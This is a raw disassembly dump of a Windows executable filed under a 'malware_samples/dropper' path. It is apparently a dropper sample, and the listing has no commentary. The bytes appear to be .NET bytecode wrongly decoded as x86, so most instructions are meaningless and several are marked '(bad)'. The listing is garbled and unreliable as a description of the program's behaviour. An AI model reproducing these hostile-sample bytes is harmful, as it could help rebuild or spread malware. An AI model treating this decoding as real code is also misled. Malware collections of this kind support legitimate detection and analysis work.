
malware_samples/dropper/ec3a45882d8734fcff4a0b8654d702c6de8834b6532b821c083c1591a0217826.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	04 09                	add    $0x9,%al
  402002:	01 00                	add    %eax,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 08 34 00    	add    %al,0x340800
  402013:	00 d4                	add    %dl,%ah
  402015:	a2 00 00 03 00       	mov    %al,0x30000
  40201a:	02 00                	add    (%eax),%al
  40201c:	14 00                	adc    $0x0,%al
  40201e:	00 06                	add    %al,(%esi)
  402020:	dc d6                	(bad)
  402022:	00 00                	add    %al,(%eax)
  402024:	d8 31                	fdivs  (%ecx)
	...
  40204e:	00 00                	add    %al,(%eax)
  402050:	1b 30                	sbb    (%eax),%esi
  402052:	0d 00 7d 04 00       	or     $0x47d00,%eax
  402057:	00 01                	add    %al,(%ecx)
  402059:	00 00                	add    %al,(%eax)
  40205b:	11 20                	adc    %esp,(%eax)
  40205d:	f7 00 00 00 0a 72    	testl  $0x720a0000,(%eax)
  402063:	01 00                	add    %eax,(%eax)
  402065:	00 70 06             	add    %dh,0x6(%eax)
  402068:	28 05 00 00 06 0b    	sub    %al,0xb060000
  40206e:	72 33                	jb     0x4020a3
  402070:	00 00                	add    %al,(%eax)
  402072:	70 06                	jo     0x40207a
  402074:	28 05 00 00 06 0c    	sub    %al,0xc060000
  40207a:	72 95                	jb     0x402011
  40207c:	00 00                	add    %al,(%eax)
  40207e:	70 06                	jo     0x402086
  402080:	28 05 00 00 06 0d    	sub    %al,0xd060000
  402086:	72 b7                	jb     0x40203f
  402088:	00 00                	add    %al,(%eax)
  40208a:	70 06                	jo     0x402092
  40208c:	28 05 00 00 06 13    	sub    %al,0x13060000
  402092:	04 07                	add    $0x7,%al
  402094:	72 c9                	jb     0x40205f
  402096:	00 00                	add    %al,(%eax)
  402098:	70 07                	jo     0x4020a1
  40209a:	28 16                	sub    %dl,(%esi)
  40209c:	00 00                	add    %al,(%eax)
  40209e:	0a 28                	or     (%eax),%ch
  4020a0:	17                   	pop    %ss
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	0a 13                	or     (%ebx),%dl
  4020a5:	05 11 05 14 28       	add    $0x28140511,%eax
  4020aa:	18 00                	sbb    %al,(%eax)
  4020ac:	00 0a                	add    %cl,(%edx)
  4020ae:	2c 08                	sub    $0x8,%al
  4020b0:	16                   	push   %ss
  4020b1:	13 07                	adc    (%edi),%eax
  4020b3:	dd 1e                	fstpl  (%esi)
  4020b5:	04 00                	add    $0x0,%al
  4020b7:	00 11                	add    %dl,(%ecx)
  4020b9:	05 17 8d 11 00       	add    $0x118d17,%eax
  4020be:	00 01                	add    %al,(%ecx)
  4020c0:	25 16 08 a2 28       	and    $0x28a20816,%eax
  4020c5:	19 00                	sbb    %eax,(%eax)
  4020c7:	00 0a                	add    %cl,(%edx)
  4020c9:	13 06                	adc    (%esi),%eax
  4020cb:	7e 30                	jle    0x4020fd
  4020cd:	00 00                	add    %al,(%eax)
  4020cf:	04 2d                	add    $0x2d,%al
  4020d1:	30 16                	xor    %dl,(%esi)
  4020d3:	72 ff                	jb     0x4020d4
  4020d5:	00 00                	add    %al,(%eax)
  4020d7:	70 14                	jo     0x4020ed
  4020d9:	d0 02                	rolb   $1,(%edx)
  4020db:	00 00                	add    %al,(%eax)
  4020dd:	02 28                	add    (%eax),%ch
  4020df:	1a 00                	sbb    (%eax),%al
  4020e1:	00 0a                	add    %cl,(%edx)
  4020e3:	17                   	pop    %ss
  4020e4:	8d 39                	lea    (%ecx),%edi
  4020e6:	00 00                	add    %al,(%eax)
  4020e8:	01 25 16 16 14 28    	add    %esp,0x28141616
  4020ee:	1b 00                	sbb    (%eax),%eax
  4020f0:	00 0a                	add    %cl,(%edx)
  4020f2:	a2 28 1c 00 00       	mov    %al,0x1c28
  4020f7:	0a 28                	or     (%eax),%ch
  4020f9:	1d 00 00 0a 80       	sbb    $0x800a0000,%eax
  4020fe:	30 00                	xor    %al,(%eax)
  402100:	00 04 7e             	add    %al,(%esi,%edi,2)
  402103:	30 00                	xor    %al,(%eax)
  402105:	00 04 7b             	add    %al,(%ebx,%edi,2)
  402108:	1e                   	push   %ds
  402109:	00 00                	add    %al,(%eax)
  40210b:	0a 7e 30             	or     0x30(%esi),%bh
  40210e:	00 00                	add    %al,(%eax)
  402110:	04 11                	add    $0x11,%al
  402112:	06                   	push   %es
  402113:	6f                   	outsl  %ds:(%esi),(%dx)
  402114:	1f                   	pop    %ds
  402115:	00 00                	add    %al,(%eax)
  402117:	0a 13                	or     (%ebx),%dl
  402119:	08 7e 31             	or     %bh,0x31(%esi)
  40211c:	00 00                	add    %al,(%eax)
  40211e:	04 2d                	add    $0x2d,%al
  402120:	24 16                	and    $0x16,%al
  402122:	d0 13                	rclb   $1,(%ebx)
  402124:	00 00                	add    %al,(%eax)
  402126:	01 28                	add    %ebp,(%eax)
  402128:	1a 00                	sbb    (%eax),%al
  40212a:	00 0a                	add    %cl,(%edx)
  40212c:	d0 02                	rolb   $1,(%edx)
  40212e:	00 00                	add    %al,(%eax)
  402130:	02 28                	add    (%eax),%ch
  402132:	1a 00                	sbb    (%eax),%al
  402134:	00 0a                	add    %cl,(%edx)
  402136:	28 20                	sub    %ah,(%eax)
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 28                	or     (%eax),%ch
  40213c:	21 00                	and    %eax,(%eax)
  40213e:	00 0a                	add    %cl,(%edx)
  402140:	80 31 00             	xorb   $0x0,(%ecx)
  402143:	00 04 7e             	add    %al,(%esi,%edi,2)
  402146:	31 00                	xor    %eax,(%eax)
  402148:	00 04 7b             	add    %al,(%ebx,%edi,2)
  40214b:	22 00                	and    (%eax),%al
  40214d:	00 0a                	add    %cl,(%edx)
  40214f:	7e 31                	jle    0x402182
  402151:	00 00                	add    %al,(%eax)
  402153:	04 11                	add    $0x11,%al
  402155:	08 6f 23             	or     %ch,0x23(%edi)
  402158:	00 00                	add    %al,(%eax)
  40215a:	0a 13                	or     (%ebx),%dl
  40215c:	09 7e 2f             	or     %edi,0x2f(%esi)
  40215f:	00 00                	add    %al,(%eax)
  402161:	04 2d                	add    $0x2d,%al
  402163:	24 16                	and    $0x16,%al
  402165:	d0 22                	shlb   $1,(%edx)
  402167:	00 00                	add    %al,(%eax)
  402169:	01 28                	add    %ebp,(%eax)
  40216b:	1a 00                	sbb    (%eax),%al
  40216d:	00 0a                	add    %cl,(%edx)
  40216f:	d0 02                	rolb   $1,(%edx)
  402171:	00 00                	add    %al,(%eax)
  402173:	02 28                	add    (%eax),%ch
  402175:	1a 00                	sbb    (%eax),%al
  402177:	00 0a                	add    %cl,(%edx)
  402179:	28 20                	sub    %ah,(%eax)
  40217b:	00 00                	add    %al,(%eax)
  40217d:	0a 28                	or     (%eax),%ch
  40217f:	24 00                	and    $0x0,%al
  402181:	00 0a                	add    %cl,(%edx)
  402183:	80 2f 00             	subb   $0x0,(%edi)
  402186:	00 04 7e             	add    %al,(%esi,%edi,2)
  402189:	2f                   	das
  40218a:	00 00                	add    %al,(%eax)
  40218c:	04 7b                	add    $0x7b,%al
  40218e:	25 00 00 0a 7e       	and    $0x7e0a0000,%eax
  402193:	2f                   	das
  402194:	00 00                	add    %al,(%eax)
  402196:	04 11                	add    $0x11,%al
  402198:	08 6f 26             	or     %ch,0x26(%edi)
  40219b:	00 00                	add    %al,(%eax)
  40219d:	0a 6f 27             	or     0x27(%edi),%ch
  4021a0:	00 00                	add    %al,(%eax)
  4021a2:	0a 13                	or     (%ebx),%dl
  4021a4:	0a 38                	or     (%eax),%bh
  4021a6:	f4                   	hlt
  4021a7:	02 00                	add    (%eax),%al
  4021a9:	00 11                	add    %dl,(%ecx)
  4021ab:	0a 6f 28             	or     0x28(%edi),%ch
  4021ae:	00 00                	add    %al,(%eax)
  4021b0:	0a 13                	or     (%ebx),%dl
  4021b2:	0b 7e 2a             	or     0x2a(%esi),%edi
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	04 2d                	add    $0x2d,%al
  4021b9:	24 16                	and    $0x16,%al
  4021bb:	d0 36                	shlb   $1,(%esi)
  4021bd:	00 00                	add    %al,(%eax)
  4021bf:	01 28                	add    %ebp,(%eax)
  4021c1:	1a 00                	sbb    (%eax),%al
  4021c3:	00 0a                	add    %cl,(%edx)
  4021c5:	d0 02                	rolb   $1,(%edx)
  4021c7:	00 00                	add    %al,(%eax)
  4021c9:	02 28                	add    (%eax),%ch
  4021cb:	1a 00                	sbb    (%eax),%al
  4021cd:	00 0a                	add    %cl,(%edx)
  4021cf:	28 20                	sub    %ah,(%eax)
  4021d1:	00 00                	add    %al,(%eax)
  4021d3:	0a 28                	or     (%eax),%ch
  4021d5:	29 00                	sub    %eax,(%eax)
  4021d7:	00 0a                	add    %cl,(%edx)
  4021d9:	80 2a 00             	subb   $0x0,(%edx)
  4021dc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4021df:	2a 00                	sub    (%eax),%al
  4021e1:	00 04 7b             	add    %al,(%ebx,%edi,2)
  4021e4:	2a 00                	sub    (%eax),%al
  4021e6:	00 0a                	add    %cl,(%edx)
  4021e8:	7e 2a                	jle    0x402214
  4021ea:	00 00                	add    %al,(%eax)
  4021ec:	04 7e                	add    $0x7e,%al
  4021ee:	29 00                	sub    %eax,(%eax)
  4021f0:	00 04 2d 30 16 72 07 	add    %al,0x7721630(,%ebp,1)
  4021f7:	01 00                	add    %eax,(%eax)
  4021f9:	70 14                	jo     0x40220f
  4021fb:	d0 02                	rolb   $1,(%edx)
  4021fd:	00 00                	add    %al,(%eax)
  4021ff:	02 28                	add    (%eax),%ch
  402201:	1a 00                	sbb    (%eax),%al
  402203:	00 0a                	add    %cl,(%edx)
  402205:	17                   	pop    %ss
  402206:	8d 39                	lea    (%ecx),%edi
  402208:	00 00                	add    %al,(%eax)
  40220a:	01 25 16 16 14 28    	add    %esp,0x28141616
  402210:	1b 00                	sbb    (%eax),%eax
  402212:	00 0a                	add    %cl,(%edx)
  402214:	a2 28 1c 00 00       	mov    %al,0x1c28
  402219:	0a 28                	or     (%eax),%ch
  40221b:	1d 00 00 0a 80       	sbb    $0x800a0000,%eax
  402220:	29 00                	sub    %eax,(%eax)
  402222:	00 04 7e             	add    %al,(%esi,%edi,2)
  402225:	29 00                	sub    %eax,(%eax)
  402227:	00 04 7b             	add    %al,(%ebx,%edi,2)
  40222a:	1e                   	push   %ds
  40222b:	00 00                	add    %al,(%eax)
  40222d:	0a 7e 29             	or     0x29(%esi),%bh
  402230:	00 00                	add    %al,(%eax)
  402232:	04 7e                	add    $0x7e,%al
  402234:	27                   	daa
  402235:	00 00                	add    %al,(%eax)
  402237:	04 2d                	add    $0x2d,%al
  402239:	34 16                	xor    $0x16,%al
  40223b:	d0 02                	rolb   $1,(%edx)
  40223d:	00 00                	add    %al,(%eax)
  40223f:	02 28                	add    (%eax),%ch
  402241:	1a 00                	sbb    (%eax),%al
  402243:	00 0a                	add    %cl,(%edx)
  402245:	18 8d 39 00 00 01    	sbb    %cl,0x1000039(%ebp)
  40224b:	25 16 16 14 28       	and    $0x28141616,%eax
  402250:	1b 00                	sbb    (%eax),%eax
  402252:	00 0a                	add    %cl,(%edx)
  402254:	a2 25 17 17 14       	mov    %al,0x14171725
  402259:	28 1b                	sub    %bl,(%ebx)
  40225b:	00 00                	add    %al,(%eax)
  40225d:	0a a2 28 2b 00 00    	or     0x2b28(%edx),%ah
  402263:	0a 28                	or     (%eax),%ch
  402265:	2c 00                	sub    $0x0,%al
  402267:	00 0a                	add    %cl,(%edx)
  402269:	80 27 00             	andb   $0x0,(%edi)
  40226c:	00 04 7e             	add    %al,(%esi,%edi,2)
  40226f:	27                   	daa
  402270:	00 00                	add    %al,(%eax)
  402272:	04 7b                	add    $0x7b,%al
  402274:	2d 00 00 0a 7e       	sub    $0x7e0a0000,%eax
  402279:	27                   	daa
  40227a:	00 00                	add    %al,(%eax)
  40227c:	04 11                	add    $0x11,%al
  40227e:	0b 09                	or     (%ecx),%ecx
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	2e 00 00             	add    %al,%cs:(%eax)
  402284:	0a 13                	or     (%ebx),%dl
  402286:	0e                   	push   %cs
  402287:	11 0e                	adc    %ecx,(%esi)
  402289:	2d 03 14 2b 4d       	sub    $0x4d2b1403,%eax
  40228e:	7e 28                	jle    0x4022b8
  402290:	00 00                	add    %al,(%eax)
  402292:	04 2d                	add    $0x2d,%al
  402294:	30 16                	xor    %dl,(%esi)
  402296:	72 17                	jb     0x4022af
  402298:	01 00                	add    %eax,(%eax)
  40229a:	70 14                	jo     0x4022b0
  40229c:	d0 02                	rolb   $1,(%edx)
  40229e:	00 00                	add    %al,(%eax)
  4022a0:	02 28                	add    (%eax),%ch
  4022a2:	1a 00                	sbb    (%eax),%al
  4022a4:	00 0a                	add    %cl,(%edx)
  4022a6:	17                   	pop    %ss
  4022a7:	8d 39                	lea    (%ecx),%edi
  4022a9:	00 00                	add    %al,(%eax)
  4022ab:	01 25 16 16 14 28    	add    %esp,0x28141616
  4022b1:	1b 00                	sbb    (%eax),%eax
  4022b3:	00 0a                	add    %cl,(%edx)
  4022b5:	a2 28 1c 00 00       	mov    %al,0x1c28
  4022ba:	0a 28                	or     (%eax),%ch
  4022bc:	1d 00 00 0a 80       	sbb    $0x800a0000,%eax
  4022c1:	28 00                	sub    %al,(%eax)
  4022c3:	00 04 7e             	add    %al,(%esi,%edi,2)
  4022c6:	28 00                	sub    %al,(%eax)
  4022c8:	00 04 7b             	add    %al,(%ebx,%edi,2)
  4022cb:	1e                   	push   %ds
  4022cc:	00 00                	add    %al,(%eax)
  4022ce:	0a 7e 28             	or     0x28(%esi),%bh
  4022d1:	00 00                	add    %al,(%eax)
  4022d3:	04 11                	add    $0x11,%al
  4022d5:	0e                   	push   %cs
  4022d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022d7:	1f                   	pop    %ds
  4022d8:	00 00                	add    %al,(%eax)
  4022da:	0a 25 2d 06 26 72    	or     0x7226062d,%ah
  4022e0:	29 01                	sub    %eax,(%ecx)
  4022e2:	00 70 6f             	add    %dh,0x6f(%eax)
  4022e5:	1f                   	pop    %ds
  4022e6:	00 00                	add    %al,(%eax)
  4022e8:	0a 6f 2f             	or     0x2f(%edi),%ch
  4022eb:	00 00                	add    %al,(%eax)
  4022ed:	0a 13                	or     (%ebx),%dl
  4022ef:	0c 7e                	or     $0x7e,%al
  4022f1:	2e 00 00             	add    %al,%cs:(%eax)
  4022f4:	04 2d                	add    $0x2d,%al
  4022f6:	24 16                	and    $0x16,%al
  4022f8:	d0 36                	shlb   $1,(%esi)
  4022fa:	00 00                	add    %al,(%eax)
  4022fc:	01 28                	add    %ebp,(%eax)
  4022fe:	1a 00                	sbb    (%eax),%al
  402300:	00 0a                	add    %cl,(%edx)
  402302:	d0 02                	rolb   $1,(%edx)
  402304:	00 00                	add    %al,(%eax)
  402306:	02 28                	add    (%eax),%ch
  402308:	1a 00                	sbb    (%eax),%al
  40230a:	00 0a                	add    %cl,(%edx)
  40230c:	28 20                	sub    %ah,(%eax)
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 28                	or     (%eax),%ch
  402312:	29 00                	sub    %eax,(%eax)
  402314:	00 0a                	add    %cl,(%edx)
  402316:	80 2e 00             	subb   $0x0,(%esi)
  402319:	00 04 7e             	add    %al,(%esi,%edi,2)
  40231c:	2e 00 00             	add    %al,%cs:(%eax)
  40231f:	04 7b                	add    $0x7b,%al
  402321:	2a 00                	sub    (%eax),%al
  402323:	00 0a                	add    %cl,(%edx)
  402325:	7e 2e                	jle    0x402355
  402327:	00 00                	add    %al,(%eax)
  402329:	04 7e                	add    $0x7e,%al
  40232b:	2d 00 00 04 2d       	sub    $0x2d040000,%eax
  402330:	30 16                	xor    %dl,(%esi)
  402332:	72 07                	jb     0x40233b
  402334:	01 00                	add    %eax,(%eax)
  402336:	70 14                	jo     0x40234c
  402338:	d0 02                	rolb   $1,(%edx)
  40233a:	00 00                	add    %al,(%eax)
  40233c:	02 28                	add    (%eax),%ch
  40233e:	1a 00                	sbb    (%eax),%al
  402340:	00 0a                	add    %cl,(%edx)
  402342:	17                   	pop    %ss
  402343:	8d 39                	lea    (%ecx),%edi
  402345:	00 00                	add    %al,(%eax)
  402347:	01 25 16 16 14 28    	add    %esp,0x28141616
  40234d:	1b 00                	sbb    (%eax),%eax
  40234f:	00 0a                	add    %cl,(%edx)
  402351:	a2 28 1c 00 00       	mov    %al,0x1c28
  402356:	0a 28                	or     (%eax),%ch
  402358:	1d 00 00 0a 80       	sbb    $0x800a0000,%eax
  40235d:	2d 00 00 04 7e       	sub    $0x7e040000,%eax
  402362:	2d 00 00 04 7b       	sub    $0x7b040000,%eax
  402367:	1e                   	push   %ds
  402368:	00 00                	add    %al,(%eax)
  40236a:	0a 7e 2d             	or     0x2d(%esi),%bh
  40236d:	00 00                	add    %al,(%eax)
  40236f:	04 7e                	add    $0x7e,%al
  402371:	2b 00                	sub    (%eax),%eax
  402373:	00 04 2d 34 16 d0 02 	add    %al,0x2d01634(,%ebp,1)
  40237a:	00 00                	add    %al,(%eax)
  40237c:	02 28                	add    (%eax),%ch
  40237e:	1a 00                	sbb    (%eax),%al
  402380:	00 0a                	add    %cl,(%edx)
  402382:	18 8d 39 00 00 01    	sbb    %cl,0x1000039(%ebp)
  402388:	25 16 16 14 28       	and    $0x28141616,%eax
  40238d:	1b 00                	sbb    (%eax),%eax
  40238f:	00 0a                	add    %cl,(%edx)
  402391:	a2 25 17 17 14       	mov    %al,0x14171725
  402396:	28 1b                	sub    %bl,(%ebx)
  402398:	00 00                	add    %al,(%eax)
  40239a:	0a a2 28 2b 00 00    	or     0x2b28(%edx),%ah
  4023a0:	0a 28                	or     (%eax),%ch
  4023a2:	2c 00                	sub    $0x0,%al
  4023a4:	00 0a                	add    %cl,(%edx)
  4023a6:	80 2b 00             	subb   $0x0,(%ebx)
  4023a9:	00 04 7e             	add    %al,(%esi,%edi,2)
  4023ac:	2b 00                	sub    (%eax),%eax
  4023ae:	00 04 7b             	add    %al,(%ebx,%edi,2)
  4023b1:	2d 00 00 0a 7e       	sub    $0x7e0a0000,%eax
  4023b6:	2b 00                	sub    (%eax),%eax
  4023b8:	00 04 11             	add    %al,(%ecx,%edx,1)
  4023bb:	0b 11                	or     (%ecx),%edx
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	2e 00 00             	add    %al,%cs:(%eax)
  4023c2:	0a 13                	or     (%ebx),%dl
  4023c4:	0e                   	push   %cs
  4023c5:	11 0e                	adc    %ecx,(%esi)
  4023c7:	2d 03 14 2b 4d       	sub    $0x4d2b1403,%eax
  4023cc:	7e 2c                	jle    0x4023fa
  4023ce:	00 00                	add    %al,(%eax)
  4023d0:	04 2d                	add    $0x2d,%al
  4023d2:	30 16                	xor    %dl,(%esi)
  4023d4:	72 17                	jb     0x4023ed
  4023d6:	01 00                	add    %eax,(%eax)
  4023d8:	70 14                	jo     0x4023ee
  4023da:	d0 02                	rolb   $1,(%edx)
  4023dc:	00 00                	add    %al,(%eax)
  4023de:	02 28                	add    (%eax),%ch
  4023e0:	1a 00                	sbb    (%eax),%al
  4023e2:	00 0a                	add    %cl,(%edx)
  4023e4:	17                   	pop    %ss
  4023e5:	8d 39                	lea    (%ecx),%edi
  4023e7:	00 00                	add    %al,(%eax)
  4023e9:	01 25 16 16 14 28    	add    %esp,0x28141616
  4023ef:	1b 00                	sbb    (%eax),%eax
  4023f1:	00 0a                	add    %cl,(%edx)
  4023f3:	a2 28 1c 00 00       	mov    %al,0x1c28
  4023f8:	0a 28                	or     (%eax),%ch
  4023fa:	1d 00 00 0a 80       	sbb    $0x800a0000,%eax
  4023ff:	2c 00                	sub    $0x0,%al
  402401:	00 04 7e             	add    %al,(%esi,%edi,2)
  402404:	2c 00                	sub    $0x0,%al
  402406:	00 04 7b             	add    %al,(%ebx,%edi,2)
  402409:	1e                   	push   %ds
  40240a:	00 00                	add    %al,(%eax)
  40240c:	0a 7e 2c             	or     0x2c(%esi),%bh
  40240f:	00 00                	add    %al,(%eax)
  402411:	04 11                	add    $0x11,%al
  402413:	0e                   	push   %cs
  402414:	6f                   	outsl  %ds:(%esi),(%dx)
  402415:	1f                   	pop    %ds
  402416:	00 00                	add    %al,(%eax)
  402418:	0a 25 2d 06 26 72    	or     0x7226062d,%ah
  40241e:	29 01                	sub    %eax,(%ecx)
  402420:	00 70 6f             	add    %dh,0x6f(%eax)
  402423:	1f                   	pop    %ds
  402424:	00 00                	add    %al,(%eax)
  402426:	0a 6f 2f             	or     0x2f(%edi),%ch
  402429:	00 00                	add    %al,(%eax)
  40242b:	0a 13                	or     (%ebx),%dl
  40242d:	0d 11 0c 72 2b       	or     $0x2b720c11,%eax
  402432:	01 00                	add    %eax,(%eax)
  402434:	70 6f                	jo     0x4024a5
  402436:	30 00                	xor    %al,(%eax)
  402438:	00 0a                	add    %cl,(%edx)
  40243a:	2c 16                	sub    $0x16,%al
  40243c:	11 0d 72 57 01 00    	adc    %ecx,0x15772
  402442:	70 6f                	jo     0x4024b3
  402444:	30 00                	xor    %al,(%eax)
  402446:	00 0a                	add    %cl,(%edx)
  402448:	2c 08                	sub    $0x8,%al
  40244a:	17                   	pop    %ss
  40244b:	13 07                	adc    (%edi),%eax
  40244d:	dd 84 00 00 00 11 0c 	fldl   0xc110000(%eax,%eax,1)
  402454:	72 67                	jb     0x4024bd
  402456:	01 00                	add    %eax,(%eax)
  402458:	70 6f                	jo     0x4024c9
  40245a:	30 00                	xor    %al,(%eax)
  40245c:	00 0a                	add    %cl,(%edx)
  40245e:	2c 05                	sub    $0x5,%al
  402460:	17                   	pop    %ss
  402461:	13 07                	adc    (%edi),%eax
  402463:	de 71 11             	fidivs 0x11(%ecx)
  402466:	0d 72 75 01 00       	or     $0x17572,%eax
  40246b:	70 6f                	jo     0x4024dc
  40246d:	30 00                	xor    %al,(%eax)
  40246f:	00 0a                	add    %cl,(%edx)
  402471:	2c 05                	sub    $0x5,%al
  402473:	17                   	pop    %ss
  402474:	13 07                	adc    (%edi),%eax
  402476:	de 5e 11             	ficomps 0x11(%esi)
  402479:	0c 72                	or     $0x72,%al
  40247b:	8b 01                	mov    (%ecx),%eax
  40247d:	00 70 6f             	add    %dh,0x6f(%eax)
  402480:	30 00                	xor    %al,(%eax)
  402482:	00 0a                	add    %cl,(%edx)
  402484:	2c 05                	sub    $0x5,%al
  402486:	17                   	pop    %ss
  402487:	13 07                	adc    (%edi),%eax
  402489:	de 4b 11             	fimuls 0x11(%ebx)
  40248c:	0c 72                	or     $0x72,%al
  40248e:	95                   	xchg   %eax,%ebp
  40248f:	01 00                	add    %eax,(%eax)
  402491:	70 6f                	jo     0x402502
  402493:	30 00                	xor    %al,(%eax)
  402495:	00 0a                	add    %cl,(%edx)
  402497:	2c 05                	sub    $0x5,%al
  402499:	17                   	pop    %ss
  40249a:	13 07                	adc    (%edi),%eax
  40249c:	de 38                	fidivrs (%eax)
  40249e:	11 0a                	adc    %ecx,(%edx)
  4024a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4024a1:	31 00                	xor    %eax,(%eax)
  4024a3:	00 0a                	add    %cl,(%edx)
  4024a5:	3a 00                	cmp    (%eax),%al
  4024a7:	fd                   	std
  4024a8:	ff                   	(bad)
  4024a9:	ff                   	lcall  (bad)
  4024aa:	de 15 11 0a 75 13    	ficoms 0x13750a11
  4024b0:	00 00                	add    %al,(%eax)
  4024b2:	01 13                	add    %edx,(%ebx)
  4024b4:	0f 11 0f             	movups %xmm1,(%edi)
  4024b7:	2c 07                	sub    $0x7,%al
  4024b9:	11 0f                	adc    %ecx,(%edi)
  4024bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4024bc:	32 00                	xor    (%eax),%al
  4024be:	00 0a                	add    %cl,(%edx)
  4024c0:	dc de                	(bad)
  4024c2:	0c 11                	or     $0x11,%al
  4024c4:	09 2c 07             	or     %ebp,(%edi,%eax,1)
  4024c7:	11 09                	adc    %ecx,(%ecx)
  4024c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4024ca:	32 00                	xor    (%eax),%al
  4024cc:	00 0a                	add    %cl,(%edx)
  4024ce:	dc de                	(bad)
  4024d0:	03 26                	add    (%esi),%esp
  4024d2:	de 00                	fiadds (%eax)
  4024d4:	16                   	push   %ss
  4024d5:	2a 11                	sub    (%ecx),%dl
  4024d7:	07                   	pop    %es
  4024d8:	2a 00                	sub    (%eax),%al
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	41                   	inc    %ecx
  4024dd:	4c                   	dec    %esp
  4024de:	00 00                	add    %al,(%eax)
  4024e0:	02 00                	add    (%eax),%al
  4024e2:	00 00                	add    %al,(%eax)
  4024e4:	49                   	dec    %ecx
  4024e5:	01 00                	add    %eax,(%eax)
  4024e7:	00 07                	add    %al,(%edi)
  4024e9:	03 00                	add    (%eax),%eax
  4024eb:	00 50 04             	add    %dl,0x4(%eax)
  4024ee:	00 00                	add    %al,(%eax)
  4024f0:	15 00 00 00 00       	adc    $0x0,%eax
  4024f5:	00 00                	add    %al,(%eax)
  4024f7:	00 02                	add    %al,(%edx)
  4024f9:	00 00                	add    %al,(%eax)
  4024fb:	00 01                	add    %al,(%ecx)
  4024fd:	01 00                	add    %eax,(%eax)
  4024ff:	00 66 03             	add    %ah,0x3(%esi)
  402502:	00 00                	add    %al,(%eax)
  402504:	67 04 00             	addr16 add $0x0,%al
  402507:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  402512:	00 00                	add    %al,(%eax)
  402514:	06                   	push   %es
  402515:	00 00                	add    %al,(%eax)
  402517:	00 6f 04             	add    %ch,0x4(%edi)
  40251a:	00 00                	add    %al,(%eax)
  40251c:	75 04                	jne    0x402522
  40251e:	00 00                	add    %al,(%eax)
  402520:	03 00                	add    (%eax),%eax
  402522:	00 00                	add    %al,(%eax)
  402524:	11 00                	adc    %eax,(%eax)
  402526:	00 01                	add    %al,(%ecx)
  402528:	1b 30                	sbb    (%eax),%esi
  40252a:	03 00                	add    (%eax),%eax
  40252c:	77 00                	ja     0x40252e
  40252e:	00 00                	add    %al,(%eax)
  402530:	02 00                	add    (%eax),%al
  402532:	00 11                	add    %dl,(%ecx)
  402534:	20 f7                	and    %dh,%bh
  402536:	00 00                	add    %al,(%eax)
  402538:	00 0a                	add    %cl,(%edx)
  40253a:	28 33                	sub    %dh,(%ebx)
  40253c:	00 00                	add    %al,(%eax)
  40253e:	0a 2c 02             	or     (%edx,%eax,1),%ch
  402541:	17                   	pop    %ss
  402542:	2a 00                	sub    (%eax),%al
  402544:	72 a9                	jb     0x4024ef
  402546:	01 00                	add    %eax,(%eax)
  402548:	70 06                	jo     0x402550
  40254a:	28 05 00 00 06 72    	sub    %al,0x72060000
  402550:	c3                   	ret
  402551:	01 00                	add    %eax,(%eax)
  402553:	70 06                	jo     0x40255b
  402555:	28 05 00 00 06 0b    	sub    %al,0xb060000
  40255b:	28 08                	sub    %cl,(%eax)
  40255d:	00 00                	add    %al,(%eax)
  40255f:	06                   	push   %es
  402560:	0c 08                	or     $0x8,%al
  402562:	7e 34                	jle    0x402598
  402564:	00 00                	add    %al,(%eax)
  402566:	0a 28                	or     (%eax),%ch
  402568:	35 00 00 0a 2c       	xor    $0x2c0a0000,%eax
  40256d:	33 08                	xor    (%eax),%ecx
  40256f:	07                   	pop    %es
  402570:	28 07                	sub    %al,(%edi)
  402572:	00 00                	add    %al,(%eax)
  402574:	06                   	push   %es
  402575:	0d 09 7e 34 00       	or     $0x347e09,%eax
  40257a:	00 0a                	add    %cl,(%edx)
  40257c:	28 35 00 00 0a 2c    	sub    %dh,0x2c0a0000
  402582:	1e                   	push   %ds
  402583:	09 d0                	or     %edx,%eax
  402585:	07                   	pop    %es
  402586:	00 00                	add    %al,(%eax)
  402588:	02 28                	add    (%eax),%ch
  40258a:	1a 00                	sbb    (%eax),%al
  40258c:	00 0a                	add    %cl,(%edx)
  40258e:	28 36                	sub    %dh,(%esi)
  402590:	00 00                	add    %al,(%eax)
  402592:	0a 74 07 00          	or     0x0(%edi,%eax,1),%dh
  402596:	00 02                	add    %al,(%edx)
  402598:	6f                   	outsl  %ds:(%esi),(%dx)
  402599:	24 00                	and    $0x0,%al
  40259b:	00 06                	add    %al,(%esi)
  40259d:	13 04 de             	adc    (%esi,%ebx,8),%eax
  4025a0:	07                   	pop    %es
  4025a1:	de 03                	fiadds (%ebx)
  4025a3:	26 de 00             	fiadds %es:(%eax)
  4025a6:	16                   	push   %ss
  4025a7:	2a 11                	sub    (%ecx),%dl
  4025a9:	04 2a                	add    $0x2a,%al
  4025ab:	00 01                	add    %al,(%ecx)
  4025ad:	10 00                	adc    %al,(%eax)
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 10                	add    %dl,(%eax)
  4025b3:	00 5f 6f             	add    %bl,0x6f(%edi)
  4025b6:	00 03                	add    %al,(%ebx)
  4025b8:	11 00                	adc    %eax,(%eax)
  4025ba:	00 01                	add    %al,(%ecx)
  4025bc:	56                   	push   %esi
  4025bd:	28 02                	sub    %al,(%edx)
  4025bf:	00 00                	add    %al,(%eax)
  4025c1:	06                   	push   %es
  4025c2:	2d 07 28 01 00       	sub    $0x12807,%eax
  4025c7:	00 06                	add    %al,(%esi)
  4025c9:	2c 06                	sub    $0x6,%al
  4025cb:	16                   	push   %ss
  4025cc:	28 37                	sub    %dh,(%edi)
  4025ce:	00 00                	add    %al,(%eax)
